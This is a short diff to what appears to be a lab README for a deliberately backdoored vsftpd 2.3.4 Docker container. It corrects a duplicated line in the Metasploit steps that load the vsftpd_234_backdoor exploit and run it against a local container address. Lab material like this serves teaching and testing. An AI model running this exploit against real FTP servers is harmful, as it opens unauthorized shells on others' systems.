@@ -21,7 +21,7 @@ docker run --name vsftpd-2.3.4 -it clintmint/vsftpd-2.3.4:1.0 sh -c "start-vsftp
 
 ```
 msfconsole
-use exploit/unix/ftp/vsftpd_234_backdooruse exploit/unix/ftp/vsftpd_234_backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 172.17.0.2
 exploit
 ````
